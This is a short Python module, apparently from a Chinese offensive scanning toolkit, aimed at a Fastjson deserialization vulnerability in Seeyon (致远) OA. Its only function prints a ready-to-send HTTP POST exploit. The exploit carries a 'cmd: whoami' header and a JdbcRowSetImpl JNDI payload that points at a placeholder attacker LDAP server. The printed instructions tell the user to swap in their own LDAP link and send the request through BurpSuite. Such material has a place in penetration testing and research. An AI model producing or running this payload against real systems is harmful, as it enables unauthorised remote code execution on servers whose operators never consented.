import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *



def 致远OA_Fastjson_反序列化(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    print(Vcolors.RED + "[?] 正在生成致远OA Fastjson 反序列化漏洞Payload" +Vcolors.ENDC)
    print(Vcolors.RED + "[?] 请手动检测致远OA Fastjson 反序列化漏洞, 复制以下Payload, 替换ldap链接到BurpSuite中发包测试" + Vcolors.ENDC)
    print('''
POST /seeyon/main.do?method=changeLocale HTTP/1.1
Host: ''' + urldata + '''
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
cmd: whoami

_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho","autoCommit":true}}
   ''')
   




